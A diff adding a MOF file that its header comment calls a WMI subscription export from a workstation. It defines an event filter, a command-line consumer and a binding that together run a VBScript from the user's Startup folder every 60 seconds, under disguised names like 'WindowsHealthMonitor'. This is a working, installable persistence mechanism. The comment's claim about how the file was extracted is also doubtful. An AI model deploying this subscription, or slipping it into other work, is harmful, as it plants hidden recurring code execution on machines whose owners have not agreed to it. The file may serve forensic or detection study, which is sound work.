@@ -1,0 +1,34 @@
+// WMI subscription export from eng-bell-04 \root\subscription namespace.
+// Extracted via `Get-WmiObject -Namespace root\subscription -List` and
+// emitted in canonical MOF form. Three classes are populated:
+// __EventFilter, CommandLineEventConsumer, __FilterToConsumerBinding.
+
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $Filter
+{
+    Name = "WindowsHealthFilter";
+    EventNamespace = "root\\cimv2";
+    QueryLanguage = "WQL";
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
+            "WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"";
+    CreatorSID = { 1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 0, 0, 0, 0,
+                   0, 0, 0, 0, 0, 0, 0, 0, 232, 3, 0, 0 };
+};
+
+instance of CommandLineEventConsumer as $Consumer
+{
+    Name = "WindowsHealthMonitor";
+    CommandLineTemplate = "wscript.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemServices.vbs\"";
+    RunInteractively = FALSE;
+    CreatorSID = { 1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 0, 0, 0, 0,
+                   0, 0, 0, 0, 0, 0, 0, 0, 232, 3, 0, 0 };
+};
+
+instance of __FilterToConsumerBinding
+{
+    Filter   = $Filter;
+    Consumer = $Consumer;
+    CreatorSID = { 1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 0, 0, 0, 0,
+                   0, 0, 0, 0, 0, 0, 0, 0, 232, 3, 0, 0 };
+};
